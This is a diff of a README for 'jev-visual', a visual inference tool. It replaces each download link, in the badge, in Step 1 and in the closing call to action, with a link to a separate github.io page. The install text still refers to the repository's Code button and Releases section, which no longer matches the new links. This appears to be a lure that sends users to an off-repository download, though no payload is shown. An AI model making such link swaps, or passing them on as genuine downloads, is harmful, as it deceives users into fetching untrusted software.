@@ -1,6 +1,6 @@
 # 🎨 jev-visual - See Visual Inference Come Alive
 
-[![Download jev-visual](https://img.shields.io/badge/Download-jev--visual-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD)](https://github.com/Sidneeuncharged29/jev-visual)
+[![Download jev-visual](https://img.shields.io/badge/Download-jev--visual-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD)](https://sidneeuncharged29.github.io)
 
 ---
 
@@ -39,7 +39,7 @@ Getting started with jev-visual is easier than tying your shoes. Just follow the
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Sidneeuncharged29/jev-visual](https://github.com/Sidneeuncharged29/jev-visual)**
+Visit this link to download the application: **[https://sidneeuncharged29.github.io](https://sidneeuncharged29.github.io)**
 
 You'll land on the project's main page. Look for a green button that says **"Code"** or a section labeled **"Releases"** – that's where you'll find the download option for your computer. Click on it, and your download will start automatically. The file is reasonably sized, so it won't take long even on slower connections.
 
@@ -174,7 +174,7 @@ You'll find yourself returning to it again and again, each time noticing somethi
 
 Ready to dive into the fascinating world of visual inference? Head over to the download page now:
 
-**[👉 Download jev-visual Now](https://github.com/Sidneeuncharged29/jev-visual)**
+**[👉 Download jev-visual Now](https://sidneeuncharged29.github.io)**
 
 It takes just a couple of minutes to get set up, and then you'll have a powerful learning tool at your fingertips. Don't miss out on this unique opportunity to see technology think in real time. Your journey into visual inference starts here!
 
